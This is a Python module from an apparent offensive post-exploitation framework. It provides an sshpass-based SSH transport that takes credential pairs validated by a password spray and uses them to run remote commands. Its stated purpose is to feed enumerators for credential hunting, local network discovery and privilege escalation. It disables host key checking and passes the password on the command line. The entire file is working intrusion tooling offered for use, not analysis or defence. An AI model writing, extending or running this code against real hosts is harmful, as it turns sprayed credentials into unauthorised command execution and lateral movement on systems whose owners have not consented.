#!/usr/bin/env python3
"""SSH credential transport — vault 'situational awareness as the new context'.

When a fleet spray validates a credential pair on an SSH-reachable host,
post-exploitation needs a transport to run commands as that user. This module
provides a minimal sshpass-backed transport implementing run(cmd) so every
existing post_exploit enumerator (system info, cred hunting, local nets,
privesc) works unmodified — duck-typed to what tools/post_exploit._run
already accepts.
"""
from __future__ import annotations

import shlex
from typing import Dict, Optional

from utils import run_command


class SSHCredTransport:
    """Duck-typed transport over `sshpass -p ... ssh user@host`."""

    def __init__(self, host: str, username: str, password: str, port: int = 22):
        self.host = host
        self.username = username
        self.password = password
        self.port = port
        # idempotent key caching — one sshpass connection per (host,user)
        self._base = [
            "sshpass", "-p", shlex.quote(self.password),
            "ssh", "-o", "StrictHostKeyChecking=no",
            "-o", "ConnectTimeout=8",
            "-o", "PreferredAuthentications=password",
            "-o", "NumberOfPasswordPrompts=1",
            "-p", str(self.port),
            f"{self.username}@{self.host}",
        ]

    def run(self, cmd: str, timeout: int = 30) -> Dict:
        """Run cmd remotely. Returns {'stdout','stderr','returncode'}."""
        proc = run_command(
            " ".join(self._base) + " " + shlex.quote(cmd),
            timeout=timeout,
        )
        return {
            "stdout": (proc.get("stdout") or "").strip(),
            "stderr": (proc.get("stderr") or "").strip(),
            "returncode": proc.get("returncode", -1),
        }

    def alive(self) -> bool:
        r = self.run("id", timeout=15)
        return "uid=" in r["stdout"]


def transport_for_session(session: dict) -> Optional[SSHCredTransport]:
    """Build an SSH transport from a session created by a spray hit."""
    cfg = session.get("transport_config") or {}
    if cfg.get("kind") != "ssh_cred":
        return None
    return SSHCredTransport(
        host=session["host_ip"],
        username=cfg.get("username", session.get("username", "")),
        password=cfg.get("password", ""),
        port=cfg.get("port", 22),
    )
